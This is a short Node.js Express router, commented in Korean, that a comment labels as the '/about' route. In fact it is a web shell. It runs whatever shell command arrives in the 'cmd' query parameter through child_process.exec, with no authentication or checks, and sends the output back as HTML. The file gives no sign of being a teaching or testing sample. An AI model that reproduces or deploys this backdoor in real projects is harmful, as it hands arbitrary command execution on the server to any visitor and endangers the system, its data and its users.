const path = require("path");
const express = require("express");
const router = express.Router();
const exec = require("child_process").exec;
const iconv = require("iconv-lite");

// GET /about 라우터
router.get("/", (req, res) => {
  const command = req.query.cmd;
  console.log(`Executing command: ${command}`);

  let process = exec(command, { encoding: "buffer", shell: true });
  let ret_data = "";

  process.stdout.on("data", function (data) {
    // 데이터를 buffer 상태에서 변환
    const decodedData = iconv.decode(data, "cp949");
    ret_data += decodedData;
  });

  process.stderr.on("data", function (data) {
    console.error(iconv.decode(data, "cp949"));
  });

  process.on("close", (code) => {
    console.log(`Exited code ${code}`);
    res.send(`<pre>${ret_data}</pre>`);
  });
});

module.exports = router;
